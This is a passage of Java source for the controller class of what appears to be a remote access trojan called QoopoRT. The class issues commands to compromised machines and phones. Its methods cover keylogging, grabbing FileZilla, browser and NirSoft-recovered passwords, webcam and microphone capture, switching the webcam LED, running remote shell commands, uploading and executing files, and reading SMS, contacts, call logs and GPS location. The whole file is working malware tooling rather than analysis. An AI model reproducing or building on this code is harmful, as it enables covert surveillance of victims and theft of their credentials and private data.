package qooport.asociado;

import comunes.Accion;
import comunes.CapturaOpciones;
import comunes.Comando;
import comunes.Evento;
import java.awt.BorderLayout;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.text.BadLocationException;
import network.Conexion;
import network.ConexionServer;
import plugin.Plugin;
import qooport.asociado.v2.AsociadoV2;
import qooport.avanzado.ModoAvanzado;
import qooport.avanzado.Plugins;
import qooport.avanzado.QoopoRT;
import qooport.modulos.ArchivosOffline;
import qooport.modulos.Informacion;
import qooport.modulos.Mapa;
import qooport.modulos.Mensajes;
import qooport.modulos.Portapapeles;
import qooport.modulos.android.Contactos;
import qooport.modulos.android.Llamadas;
import qooport.modulos.android.SMSListar;
import qooport.modulos.archivos.AdminArchivos;
import qooport.modulos.archivos.anterior.SubirArchivo;
import qooport.modulos.archivos.cola.ColaEnvio;
import qooport.modulos.archivos.transferencia.Descarga;
import qooport.modulos.archivos.transferencia.Transferencia;
import qooport.modulos.camara.Camara;
import qooport.modulos.escritorioremoto.EscritorioRemoto;
import qooport.modulos.keylogger.KeyLogger;
import qooport.modulos.pc.Chat;
import qooport.modulos.pc.Conexiones;
import qooport.modulos.pc.MonitorSistemaAsociado;
import qooport.modulos.pc.Passwords;
import qooport.modulos.pc.Procesos;
import qooport.modulos.pc.RedLan;
import qooport.modulos.pc.TextoSpeak;
import qooport.modulos.pc.terminal.Terminal;
import qooport.modulos.voip.VoIp;
import qooport.utilidades.Compresor;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.Util;
import qooport.utilidades.cifrado.Encriptacion;

/**
 *
 * @author Alberto
 */
public abstract class Asociado extends Thread {

    public static String guardarIcono(byte[] datos, String nombre) {
        if (datos != null) {
            File file = new File(nombre);
            try {
                file.delete();
            } catch (Exception e) {
            }
            try {
                file.createNewFile();
                FileOutputStream fout = new FileOutputStream(file);
                fout.write(datos);
                fout.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            file = null;
        }
        return nombre;
    }

    public static Comando crearComando(int comando, int nParametros, Object objeto) {
        try {
            Comando cmd = new Comando(comando, nParametros, objeto);
            return cmd;
        } catch (Exception ex) {

        }
        return null;
    }

    //    public static String leerCadena(byte[] cadena) {
    public static String parsearCadena(byte[] cadena, boolean antiguo) {
        try {
            if (antiguo) {
                return Encriptacion.descifra(cadena);
            } else {
                return Encriptacion.descifra(Compresor.descomprimirGZIP(cadena));
            }
        } catch (Exception ex) {
            return new String(cadena);
        }
    }

    protected boolean ssl;
    //estas acciones son para poder actualizar la barra de estado en el modo simple
    protected Accion accionInfo;//accion a ejecutar cuando se recibe la info
    protected Accion accionAutenticar;//accion a ejecutar cuando se esta autenticando
    protected Accion accionAbrirEscritorio;//accion a ejecutar cuando se abre el escritorio
    protected Accion accionDesconectar;//accion a ejecutar cuando se desconecta
    protected Accion accionListo;//accion a ejecutar cuando se termino el proceso de conexion, cuadno se abre el escritorio remoto en el modo simple
    protected boolean infoRecibida = false;
    protected TareaPing hiloPing = new TareaPing();
    protected ScheduledExecutorService programadorPing;
    protected int intentos = 0;
    protected boolean antiguo = false;
    protected Conexion conexion;
    protected String identificador;
    protected String pais;
    protected String bandera;
    protected String usuario;
    protected String host;
    protected String ipInterna;
    protected String so;
    protected String ip;
    protected String webCam;
    protected boolean activo;
    protected long ping;
    protected long pong;
    protected long tiempoVida;
    protected String[] datos;
    protected File dPrincipal;//carpeta del cliente
    protected File dDescargas;//carpeta de descargas
    protected File dImagenes; //carpeta de imagenes
    protected File dWebCam;//carpeta de las capturas de la webcam
    protected File dEscritorio;// carpeta de las capturas del escritorio remoto
    protected File dAudio;//carpeta de las capturas de las grabaciones de audio
    protected File fKeylogger;//archivo del keylogger
    protected File dInfor;//carpeta donde se almacena lso archivos de informacion
    protected File dCapturas;//carpeta donde se almacena las capturas descargadas
    protected ImageIcon vistaPreviaEscritorio;
    protected ImageIcon vistaPreviaWC;
    protected ImageIcon usuarioAvatar;
    protected boolean android;
    protected long bytesEnviados;
    protected long bytesRecibidos;
    protected boolean pidiendoVistaPreviaWC = false;
    protected int tipoconexionI__D;
    protected int puertoTransferencia;// para la conexion directa
    protected String hostConexion;// host/ip usado para conectar directamente
    protected int puerto;// puerto usado parala conexion directa
    protected EscritorioRemoto escritorioRemoto;
    protected Camara camara;
    protected AdminArchivos adminArchivos;
    protected VoIp vopIp;
    protected Passwords passwords;
    protected Mapa mapa;
    protected Contactos contactos;
    protected SMSListar smsListar;
    protected Llamadas llamadas;
    protected Informacion informacionGUI;
    protected Portapapeles portapapeles;
    protected KeyLogger keylogger;
    protected Terminal consola;
    protected Procesos procesos;
    protected Conexiones conexiones;
    protected Chat chat;
    protected ArchivosOffline archivosOffline;
    protected RedLan redLan;
    protected Mensajes venMensaje;
    protected TextoSpeak venTextoSpeak;
    protected MonitorSistemaAsociado monitorSistema;
    protected Plugins plugins;
    protected int pings = 0;//cuenta los pings sin respuesta
    protected boolean abrirEscritoriRemotoAlconectar = false;
    protected SimpleDateFormat sdfAnio = new SimpleDateFormat("yyyy");
    protected SimpleDateFormat sdfMes = new SimpleDateFormat("MM");
    protected SimpleDateFormat sdfDia = new SimpleDateFormat("dd");
    protected int contadorEstado = 0;

    protected ColaEnvio colaEnvio;

    public Asociado(Conexion conexion, int tipoconexion, boolean ssl) {
        try {
            this.ssl = ssl;
            this.conexion = conexion;
            activo = true;
            this.tipoconexionI__D = tipoconexion;
            this.ip = conexion.getInetAddress().toString(); // tomo la ip externa con el puerto hasta q consigua al enviar la informacion
            abrirEscritoriRemotoAlconectar = false;
            int tiempo = 5;//en udp es necesario tiempos cortos para saber si aun hay conexion
            if (conexion.getTipo() == ConexionServer.TCP) {
                tiempo = 60;
            }
            programadorPing = Executors.newScheduledThreadPool(1);
            programadorPing.scheduleAtFixedRate(hiloPing, 0, tiempo, TimeUnit.SECONDS);
            colaEnvio = new ColaEnvio(this);
            colaEnvio.iniciar();
        } catch (Exception ex) {
        }
    }

    public Asociado(Conexion conexion, int tipoconexion, boolean ssl, String host, int puerto) {
        try {
            this.ssl = ssl;
            this.conexion = conexion;
            activo = true;
            this.ip = conexion.getInetAddress().toString();// tomo la ip externa con el puerto hasta q consigua al enviar la informacion
            this.tipoconexionI__D = tipoconexion;
            this.hostConexion = host;
            this.puerto = puerto;
            abrirEscritoriRemotoAlconectar = false;
            int tiempo = 5;
            if (conexion.getTipo() == ConexionServer.TCP) {
                tiempo = 60;
            }
            programadorPing = Executors.newScheduledThreadPool(1);
            programadorPing.scheduleAtFixedRate(hiloPing, tiempo, tiempo, TimeUnit.SECONDS);
            colaEnvio = new ColaEnvio(this);
            colaEnvio.iniciar();
        } catch (Exception ex) {
        }
    }

    public void CierraConexion() {
        try {
            conexion.cerrar();
        } catch (Exception ex) {
        }
    }

    protected void recibirThumbail(byte[] thumbail) {
        try {
            ByteArrayInputStream inn2 = new ByteArrayInputStream(thumbail);
            BufferedImage m2 = ImageIO.read(inn2);
            ImageIcon fot = new ImageIcon(m2);
            this.getAdminArchivos().getVistaPrevia().setIcon(fot);
        } catch (Exception ex) {
        }
    }

    protected void recibirImagenUsuario(byte[] imagen) {
        try {
            ByteArrayInputStream inn = new ByteArrayInputStream(imagen);
            BufferedImage m = ImageIO.read(inn);
            try {
                this.usuarioAvatar = new ImageIcon(m);
            } catch (Exception e) {
            }
            this.agregarRecibidos(imagen.length);
            if (QoopoRT.instancia != null) {
                QoopoRT.instancia.actualizarDatosServidor(this);
            }
        } catch (Exception ex) {
        }
    }

    protected void recibirMiniatura(byte[] imagen) {
        try {
            if (imagen == null) {
                return;
            }
            ByteArrayInputStream inn = new ByteArrayInputStream(imagen);
            BufferedImage m = ImageIO.read(inn);
            try {
                this.vistaPreviaEscritorio = new ImageIcon(m);
            } catch (Exception e) {
            }
            inn.close();
            inn = null;
            m = null;
            try {
                File ff = new File(dImagenes, "miniaturas");
                if (!ff.exists()) {
                    ff.mkdirs();
                }
                if (QoopoRT.instancia != null) {
                    if (QoopoRT.instancia.getVentana().getChkGuardarMiniaturas().isSelected()) {
                        guardarIcono(imagen, new File(ff, "miniatura" + Util.nombreHora() + ".jpg").getAbsolutePath());
                    }
                }
                ff = null;
            } catch (Exception e) {
            }

            this.agregarRecibidos(imagen.length);
            if (QoopoRT.instancia != null) {
                QoopoRT.instancia.actualizarDatosServidor(this);
            }
        } catch (Exception ex) {
        }
    }

    protected void recibirMiniaturaWC(byte[] imagen) {
        try {
            if (imagen == null) {
                return;
            }
            BufferedImage m = ImageIO.read(new ByteArrayInputStream(imagen));
            try {
                this.vistaPreviaWC = new ImageIcon(m);
            } catch (Exception e) {
                //e.printStackTrace();
            }
            try {
                File ff = new File(dImagenes, "miniaturaswebcam");
                if (!ff.exists()) {
                    ff.mkdirs();
                }
                if (QoopoRT.instancia != null) {
                    if (QoopoRT.instancia.getVentana().getChkGuardarMiniaturas().isSelected()) {
                        guardarIcono(imagen, new File(ff, "miniatura" + Util.nombreHora() + ".jpg").getAbsolutePath());
                    }
                }
            } catch (Exception e) {
                //e.printStackTrace();
            }
            this.agregarRecibidos(imagen.length);
            if (QoopoRT.instancia != null) {
                QoopoRT.instancia.actualizarDatosServidor(this);
            }
            //System.out.println("listo");
        } catch (Exception ex) {
            //ex.printStackTrace();
        }
    }

    public void autenticar() {
        if (accionAutenticar != null) {
            accionAutenticar.ejecutar();
        }

        if (abrirEscritoriRemotoAlconectar) {
            String clave = null;
            JPanel pnlPwd = new JPanel();
            pnlPwd.setLayout(new BorderLayout());
            JPasswordField pwd = new JPasswordField(10);
            pnlPwd.add(GuiUtil.crearJLabel("Ingrese clave de acceso"), BorderLayout.CENTER);
            pnlPwd.add(pwd, BorderLayout.SOUTH);
            int action = JOptionPane.showConfirmDialog(null, pnlPwd, "Login", JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, Util.cargarIcono32("/resources/lock2.png"));
            if (action != JOptionPane.OK_OPTION) {
//                    System.exit(0);
                //se debe desconectar
            } else {
                clave = new String(pwd.getPassword());
            }
            enviarComando(Protocolo.AUTENTICAR, clave);
        } else {
            if (QoopoRT.instancia != null) {
                QoopoRT.instancia.autenticar(this);
            }
            intentos++;
            if (intentos > 5) {
                antiguo = !antiguo;
                intentos = 0;
            }
        }
    }

    protected void quitarServidor() {
//        programadorPing.shutdown();
        if (programadorPing != null) {
            programadorPing.shutdownNow();
        }
        programadorPing = null;
        try {
            QoopoRT.instancia.ponerEstado("Se desconectó el equipo " + this.getInfoIP());
            QoopoRT.instancia.getVentana().eliminarServidor(this, false);
        } catch (Exception e) {
        }
    }

    public void hacerPing() {
        ping = System.currentTimeMillis();
        enviarComando(Protocolo.PING);
//        System.out.println("Haciendo ping " + this.getInformacion());
        pings++;
        if (conexion.getTipo() == ConexionServer.UDP) {
            if (pings >= 3) {
                this.quitarServidor();
            }
        }
        //si no recibo informacion cierro la conexion
        if (conexion.getTipo() == ConexionServer.TCP) {
            if (!infoRecibida) {
                if (pings >= 5) {
                    System.out.println("NO SE HA RECIBIDO INFORMACION AUN " + conexion.getInetAddress().getCanonicalHostName() + "   tipo=" + ((this instanceof AsociadoV2) ? "V2" : "V1") + ". SE VA A DESCONECTAR");
                    desconectar();
                    this.quitarServidor();
                } else {
                    System.out.println("NO SE HA RECIBIDO INFORMACION AUN " + conexion.getInetAddress().getCanonicalHostName() + "   tipo=" + ((this instanceof AsociadoV2) ? "V2" : "V1"));
                }
            }
        }

    }

    public void abrirURL(String url) {
        enviarComando(Protocolo.ABRIR_URL, url);
    }

//    public void enviarEscritorioRemotoOpciones(int escala, int calidad, int ancho,
//            int alto, int tipoEscalado, int monitor, int tipoColor,
//            boolean mostrarCursor, int tipoEnvio, boolean suavizado,
//            boolean envioHilos, int tipoCaptura, boolean comprimir,
//            boolean enviarCursor, boolean portaPapeles, int tipoHilos,
//            boolean calidadAutomatica, boolean jpg, int algoritmo) {
    public abstract void enviarEscritorioRemotoOpciones(CapturaOpciones opciones);

    /**
     *
     * @param x
     * @param y
     * @param boton 0 nigun boton , diferente de 0 valor del boton q presiono
     * @param accion 0 niguna , 1 Presionado , 2 Liberado ,3 clic, 4 Rueda del
     * boton
     * @param cantidadRueda
     */
    public void enviarMouse(float x, float y, int boton, int accion, int cantidadRueda) {
        this.enviarComando(Protocolo.ESCRITORIO_REMOTO_MOUSE, x + ":" + y + ":" + boton + ":" + accion + ":" + cantidadRueda);
    }

    /**
     * Envia la lista de envetos del parametro al servidor
     *
     * @param listaEventos
     */
    public void enviarEventos(List<Evento> listaEventos) {
        if (listaEventos != null && !listaEventos.isEmpty()) {
            this.enviarComando(Protocolo.ESCRITORIO_REMOTO_EVENTO, listaEventos);
        }
    }

    /**
     * @param keyCode
     * @param accion 1 Presionado , 2 Liberado , 3 Click
     */
    public void enviarTecla(int keyCode, int accion) {
        this.enviarComando(Protocolo.ESCRITORIO_REMOTO_TECLA, keyCode + ":" + accion);
    }

    /**
     * Envia la configuracion actual del teclado
     *
     * @param configuracion
     */
    public void enviarConfiguracionEntrada(Locale configuracion) {
        this.enviarComando(Protocolo.SET_KEYBOARD_LAYOUT, configuracion);
    }

    public void pedirCPUINFO() {
        this.enviarComando(Protocolo.INFO_CPU);
    }

    public void pedirRAMINFO() {
        this.enviarComando(Protocolo.INFO_RAM);
    }

    public void pedirConfiguracionEntrada() {
        this.enviarComando(Protocolo.GET_KEYBOARD_LAYOUT);
    }

    public void enviarTecla(KeyEvent evt) {
        try {
//            QoopoRT.instancia.ponerEstado("voy a enviar ESCRITORIO_REMOTO_TECLA " + evt.paramString());
            this.enviarComando(Protocolo.TECLA_OBJETO, (Object) Util.comprimirObjeto(evt));
//            QoopoRT.instancia.ponerEstado("ESCRITORIO_REMOTO_TECLA enviada  " + evt.paramString());
        } catch (Exception e) {
            if (QoopoRT.instancia != null) {
                QoopoRT.instancia.ponerEstado("Error.  " + e.getMessage());
            }
        }
    }

    public void pedirWebCam(String formato, int tipo, int calidad) {
        this.enviarComando(Protocolo.CAPTURA_WEB_CAM, formato + ":" + tipo + ":" + calidad);
    }

    public void pedirMicAudio(String tipo) {
        this.enviarComando(Protocolo.CAPTURA_MICROFONO, tipo);
    }

    public void activarEnvioAudio(String tipo) {
        this.enviarComando(Protocolo.INICIA_AUDIO, tipo);
    }

    public void cerrarWebCam() {
        this.enviarComando(Protocolo.CERRAR_WEB_CAM);
    }

    public void abrirWebCam(String webCam) {
        this.enviarComando(Protocolo.ABRIR_WEBCAM, webCam);
    }

    public void detenerMicrofono() {
        this.enviarComando(Protocolo.DETENER_MICROFONO);
    }

    public void detenerPantalla() {
        this.enviarComando(Protocolo.ESCRITORIO_REMOTO_DETENER);
    }

    public void listarDrives() {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS);
    }

    public void buscarArchivos(String criterio, String ruta) {
        this.enviarComando(Protocolo.BUSCAR_ARCHIVO, criterio + "#" + ruta);
    }

    public void detenerBusqueda() {
        this.enviarComando(Protocolo.BUSCAR_ARCHIVO_DETENER);
    }

    public void listarContactos() {
        this.enviarComando(Protocolo.GET_LISTA_CONTACTOS);
    }

    public void listarSMS() {
        this.enviarComando(Protocolo.GET_LISTA_SMS);
    }

    public void listarLlamadas() {
        this.enviarComando(Protocolo.GET_LISTA_LLAMADAS);
    }

    public void listarPlugins() {
        this.enviarComando(Protocolo.PLUGINS_LISTAR);
    }

    public void actualizarPantalla() {
        this.enviarComando(Protocolo.ESCRITORIO_REMOTO_ACTUALIZAR_PANTALLA);
    }

    public void activarLed() {
        this.enviarComando(Protocolo.ACTIVAR_LED_CAM);
    }

    public void desactivarLed() {
        this.enviarComando(Protocolo.DESACTIVAR_LED_CAM);
    }

    public void listarWebCams() {
        this.enviarComando(Protocolo.LISTAR_WEBCAMS);
    }

    public void listarWebCamsSizes() {
        this.enviarComando(Protocolo.GET_LISTA_DIMENSIONES_CAM);
    }

    public void listarFormatosAudio() {
        this.enviarComando(Protocolo.GET_LISTA_FORMATOS_AUDIO);
    }

    public void listarMonitores() {
        this.enviarComando(Protocolo.GET_LISTA_MONITORES);
    }

    public void listarResolucionesMonitor() {
        this.enviarComando(Protocolo.GET_LISTA_RESOLUCION);
    }

    public void cambiarResolucion(String resolucion) {
        this.enviarComando(Protocolo.CAMBIAR_RESOLUCION, resolucion);
    }

    public void listarGPSProveedores() {
        this.enviarComando(Protocolo.GET_LISTA_PROVEEDORES_GPS);
    }

    public void listar(String ruta) {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO, ruta);
    }

    public void comprimir(String archivo) {
        enviarComando(Protocolo.ADMIN_ARCHIVOS_COMPRIMIR, archivo);
    }

    public void moverArchivo(String archivo, String nuevoArchivo) {
        enviarComando(Protocolo.ADMIN_ARCHIVOS_MOVER, archivo, nuevoArchivo);
    }

    public void copiarArchivo(String archivo, String nuevoArchivo) {
        enviarComando(Protocolo.ADMIN_ARCHIVOS_COPIAR, archivo, nuevoArchivo);
    }

//    public void descargar(String archivo, String rutaADescargar) {
//        descargar(archivo, rutaADescargar, 0);
//    }

    public void descargar(String archivo, String rutaADescargar, long offset) {
        if (isConexionInversa()) {
            this.enviarComando(Protocolo.ADMIN_ARCHIVOS_DESCARGAR, archivo, rutaADescargar, offset);
        } else {
            Transferencia tDescarga = new Descarga(this, archivo, rutaADescargar);
            tDescarga.iniciar();
        }
    }

    public void pedirFileZillaPass() {
        this.enviarComando(Protocolo.PASSWORDS_FILEZILLA);
    }

    public void pedirDMPass() {
        this.enviarComando(Protocolo.PASSWORDS_DM);
    }

    public void pedirInfoCompleta() {
        this.enviarComando(Protocolo.GET_INFO_COMPLETA);
    }

    public void pedirInfoSysInfo() {
        this.enviarComando(Protocolo.SYSINFO);
    }

    public void pedirListaConexiones() {
        this.enviarComando(Protocolo.GET_LISTA_CONEXIONES);
    }

    public void pedirListaProcesos() {
        this.enviarComando(Protocolo.GET_LISTA_PROCESOS);
    }

    public void matarProcesos(String pid) {
        this.enviarComando(Protocolo.MATAR_PROCESO, pid);
    }

    public void ejecutarComandoConsola(String comando) {
        this.enviarComando(Protocolo.COMANDO_SHELL, comando);
    }

    public void ejecutarComandoConsola(char comando) {
        this.enviarComando(Protocolo.COMANDO_SHELL_CHAR, comando);
    }

    public void enviarMensajeChat(String mensaje) {
        this.enviarComando(Protocolo.CHAT_MENSAJE, mensaje);
    }

    public void pedirListaOffline() {
        this.enviarComando(Protocolo.GET_LISTA_OFFLINE);
    }

    public void descargarArchivoOffline() {
        this.enviarComando(Protocolo.DESCARGAR_OFFLINE);
    }

    public void descargarListaOffline() {
        this.enviarComando(Protocolo.DESCARGAR_LISTA_OFFLINE);
    }

    public void eliminarListaOffline() {
        this.enviarComando(Protocolo.ELIMINAR_OFFLINE);
    }

    public void abrirChat() {
        this.enviarComando(Protocolo.CHAT_ABRIR);
    }

    public void cerarChat() {
        this.enviarComando(Protocolo.CHAT_CERRAR);
    }

    public void activarComandoConsola() {
        this.enviarComando(Protocolo.CONSOLA_ACTIVAR);
    }

    public void pedirPortapapeles() {
        this.enviarComando(Protocolo.GET_PORTAPAPELES);
    }

    public void pedirWBPass() {
        this.enviarComando(Protocolo.PASSWORDS_WEB);
    }

    public void pedirNirSoftPass() {
        this.enviarComando(Protocolo.PASSWORDS_NIRSOFT);
    }

    public void pedirPantallaMiniatura() {
        this.enviarComando(Protocolo.GET_MINIATURA_PANTALLA);
    }

    public void pedirResolucionPantalla() {
        this.enviarComando(Protocolo.GET_RESOLUCION);
    }

    public void pedirWebCamMiniatura() {
        pidiendoVistaPreviaWC = true;
        this.enviarComando(Protocolo.GET_MINIATURA_CAM);
    }

    public void detenerWebCamMiniatura() {
        pidiendoVistaPreviaWC = false;
        this.enviarComando(Protocolo.DETENER_VISTA_PREVIA);
    }

    public void enviarMSG(String titulo, String mensaje, int tipo) {
        this.enviarComando(Protocolo.ENVIAR_MSG, mensaje + "&&" + titulo + "&&" + tipo);
    }

    public void ejecutar(String archivo) {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_EJECUTAR, archivo);
    }

    public void pedirThumbail(String archivo) {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_THUMBAIL, archivo);
    }

    public void enviarCTRL_ALT_SUPR() {
        this.enviarComando(Protocolo.CTRL_ALT_SUPR);
    }

    public void enviarBloquearEquipo() {
        this.enviarComando(Protocolo.BLOQUEAR_EQUIPO);
    }

    public void enviarPlugin(Plugin plugin) {
        File carpeta = new File("plugins");
        try {
            carpeta.mkdirs();
        } catch (Exception e) {
        }
        for (String cadena : plugin.getListaArchivo()) {
            String[] partes = cadena.split("&&");

            File carpeta2 = new File(carpeta, "p" + plugin.getId());
            carpeta2.mkdirs();
            File p1 = new File(carpeta2, partes[0]);
            this.subirArchivo(p1.getAbsolutePath(), partes[1]);
        }
    }

    /*
    METODOS ANTERIOR PARA SUBIR LOS PLUGIN. SE USA PARA SERVDORES ANTERIORES
     */
    public void enviarPluginsWebCam() {
        File carpeta = new File("plugins");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugWC.jar");
//        File p2 = new File(carpeta, "slf4j-api-1.7.2.jar");
        File p3 = new File(carpeta, "bridj-0.7-20130703.103049-42.jar");
        this.crearCarpeta("lib", "<server>");
        this.crearCarpeta("lib", "<server>/lib");
        this.subirArchivo(p1.getAbsolutePath(), "<server>/lib");
//        this.subirArchivo(p2.getAbsolutePath(), "<server>/lib/lib");
        this.subirArchivo(p3.getAbsolutePath(), "<server>/lib/lib");
    }

    public void enviarPluginsJNA() {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugJNA.jar");
        File p2 = new File(carpeta, "jna-4.2.1.jar");
        File p3 = new File(carpeta, "jna-platform-4.2.1.jar");
        this.crearCarpeta("lib", "<server>");
        this.crearCarpeta("lib", "<server>/lib");
        this.subirArchivo(p1.getAbsolutePath(), "<server>/lib");
        this.subirArchivo(p2.getAbsolutePath(), "<server>/lib/lib");
        this.subirArchivo(p3.getAbsolutePath(), "<server>/lib/lib");
    }

    public void enviarPluginsKL() {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugKL.jar");
        this.crearCarpeta("lib", "<server>");
        this.subirArchivo(p1.getAbsolutePath(), "<server>/lib");
    }

    public void enviarPluginsNirSoft() {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugNirsoft.jar");
        this.crearCarpeta("lib", "<server>");
        this.subirArchivo(p1.getAbsolutePath(), "<server>/lib");
//        this.crearCarpeta("lib", "<server>");
//        for (String plugin : Global.nombresPluginsNirsoft) {
//            File p = new File(carpeta, plugin + ".exe");
//            this.subirArchivo(p.getAbsolutePath(), "<server>/lib");
//        }
    }

    public void subirArchivo(String rutaArchivo, String rutaRemota) {
        colaEnvio.agregarEnvio(rutaArchivo, rutaRemota);
//        enviarArchivo(rutaArchivo, rutaRemota);
    }

    public void enviarArchivo(String rutaArchivo, String rutaRemota) {
        if (isConexionInversa()) {
            this.enviarComando(Protocolo.ADMIN_ARCHIVOS_SUBIR, rutaArchivo, rutaRemota);
        } else {

            SubirArchivo sa = new SubirArchivo(this, rutaArchivo, rutaRemota);
            ModoAvanzado.paneTransferencia.setCaretPosition(ModoAvanzado.paneTransferencia.getDocument().getLength());
            ModoAvanzado.paneTransferencia.insertComponent(sa);
            QoopoRT.listaSubidas.add(sa);
            try {
                ModoAvanzado.paneTransferencia.getDocument().insertString(ModoAvanzado.paneTransferencia.getDocument().getLength(), "\n", null);
            } catch (BadLocationException ex) {
            }
            new Thread(sa).start();
        }

    }

    public void actualizarServidor(String rutaArchivo, String rutaRemota) {
        this.enviarComando(Protocolo.SUBIR_SERVIDOR, rutaArchivo, rutaRemota);
    }

    public void eliminar(String archivo) {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_ELIMINAR, archivo);
    }

    public void crearCarpeta(String carpeta, String directorioActual) {
        this.enviarComando(Protocolo.ADMIN_ARCHIVOS_CREAR_CARPETA, carpeta, directorioActual);
    }

    /**
     * Reinicia al servidor
     */
    public void reiniciar() {
        this.enviarComando(Protocolo.SERVIDOR_REINICIAR);
    }

    /**
     * Apaga el servidor
     */
    public void apagar() {
        this.enviarComando(Protocolo.SERVIDOR_APAGAR);
    }

    public void activarGPS(String provedor) {
        this.enviarComando(Protocolo.ACTIVAR_GPS, provedor);
    }

    public void pedirGPS() {
        this.enviarComando(Protocolo.PEDIR_GPS);
    }

    public void desactivarGPS() {
        this.enviarComando(Protocolo.DESACTIVAR_GPS);
    }

    public void desinstalarServidor() {
        this.enviarComando(Protocolo.SERVIDOR_DESINSTALAR);
    }

    public void reiniciarEquipo() {
        enviarComando(Protocolo.EQUIPO_REINICIAR);
    }

    public void apagarEquipo() {
        enviarComando(Protocolo.EQUIPO_APAGAR);
    }

    public void apagarMonitor() {
        enviarComando(Protocolo.MONITOR_APAGAR);
    }

    public void encenderMonitor() {
        enviarComando(Protocolo.MONITOR_ENCENDER);
    }

    public void enviarPortaPapeles(int tipo, Object objeto) {
        if (this.escritorioRemoto.getItmClipboard().isSelected()) {
            if (objeto != null) {
                //enviarComando(Protocolo.ENVIAR_PORTAPAPELES, tipo, objeto);
                enviarComando(Protocolo.ENVIAR_PORTAPAPELES, objeto);
            }

        }
    }
// #######################################################

    public String leerCadena(byte[] cadena) {
        try {
            return parsearCadena(cadena, antiguo);
        } catch (Exception ex) {
            return new String(cadena);
        }
    }

    public String getIdentificador() {
        return identificador;
    }

    public void setIdentificador(String identificador) {
        this.identificador = identificador;
    }

//    public Socket getConexion() {
//        return conexion;
//    }
//
//    public void setConexion(Socket conexion) {
//        this.conexion = conexion;
//    }
    public String getInformacion() {
        try {
            return this.getUsuario() + "@" + this.host;
        } catch (Exception e) {
            return "";
        }
    }

    public String getInfoIP() {
        return "[ (" + this.getInformacion() + ") (" + conexion.getInetAddress().getCanonicalHostName() + ") ]";
    }

    public String getPais() {
        return pais;
    }

    public void setPais(String pais) {
        this.pais = pais;
    }

    public String getUsuario() {
        return usuario;
    }

    public void setUsuario(String usuario) {
        this.usuario = usuario;
    }

    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public String getBandera() {
        return bandera;
    }

    public void setBandera(String bandera) {
        this.bandera = bandera;
    }

    public void DETENER() {
//        try {
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
        activo = false;
//        try {
//            sleep(250);
//        } catch (Exception e) {
//
//        }
        try {
            hiloPing.interrupt();
            hiloPing = null;
        } catch (Exception ex) {
        }
        try {
            conexion.cerrar();
        } catch (Exception ex) {
        }
//                }
//            }).start();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    public long getTiempoVida() {
        return tiempoVida;
    }

    public void setTiempoVida(long tiempoVida) {
        this.tiempoVida = tiempoVida;
    }

    public String[] getDatos() {
        return datos;
    }

    public void setDatos(String[] datos) {
        this.datos = datos;
    }

    public File getdDescargas() {
        return dDescargas;
    }

    public void setdDescargas(File dDescargas) {
        this.dDescargas = dDescargas;
    }

    public File getdImagenes() {
        return dImagenes;
    }

    public void setdImagenes(File dImagenes) {
        this.dImagenes = dImagenes;
    }

    public File getdWebCam() {
        return dWebCam;
    }

    public void setdWebCam(File dWebCam) {
        this.dWebCam = dWebCam;
    }

    public File getdEscritorio() {
        return dEscritorio;
    }

    public void setdEscritorio(File dEscritorio) {
        this.dEscritorio = dEscritorio;
    }

    public File getdPrincipal() {
        return dPrincipal;
    }

    public void setdPrincipal(File dPrincipal) {
        this.dPrincipal = dPrincipal;
    }

    public File getdAudio() {
        return dAudio;
    }

    public void setdAudio(File dAudio) {
        this.dAudio = dAudio;
    }

    public ImageIcon getVistaPreviaEscritorio() {
        return vistaPreviaEscritorio;
    }

    public File getdInfor() {
        return dInfor;
    }

    public void setdInfor(File dInfor) {
        this.dInfor = dInfor;
    }

    public File getdCapturas() {
        return dCapturas;
    }

    public void setdCapturas(File dCapturas) {
        this.dCapturas = dCapturas;
    }

    public void setVistaPreviaEscritorio(ImageIcon vistaPreviaEscritorio) {
        this.vistaPreviaEscritorio = vistaPreviaEscritorio;
    }

    public String getHost() {
        return host;
    }

    public void setHost(String host) {
        this.host = host;
    }

    public String getIpInterna() {
        return ipInterna;
    }

    public void setIpInterna(String ipInterna) {
        this.ipInterna = ipInterna;
    }

    public String getSo() {
        return so;
    }

    public void setSo(String so) {
        this.so = so;
    }

    public boolean isAndroid() {
        return android;
    }

    public void setAndroid(boolean android) {
        this.android = android;
    }

    public String getWebCam() {
        return webCam;
    }

    public void setWebCam(String webCam) {
        this.webCam = webCam;
    }

    public long getBytesEnviados() {
        return bytesEnviados;
    }

    public void setBytesEnviados(long bytesEnviados) {
        this.bytesEnviados = bytesEnviados;
    }

    public long getBytesRecibidos() {
        return bytesRecibidos;
    }

    public void setBytesRecibidos(long bytesRecibidos) {
        this.bytesRecibidos = bytesRecibidos;
    }

    public void agregarEnviados(long enviados) {
        bytesEnviados += enviados;
        if (QoopoRT.instancia != null) {
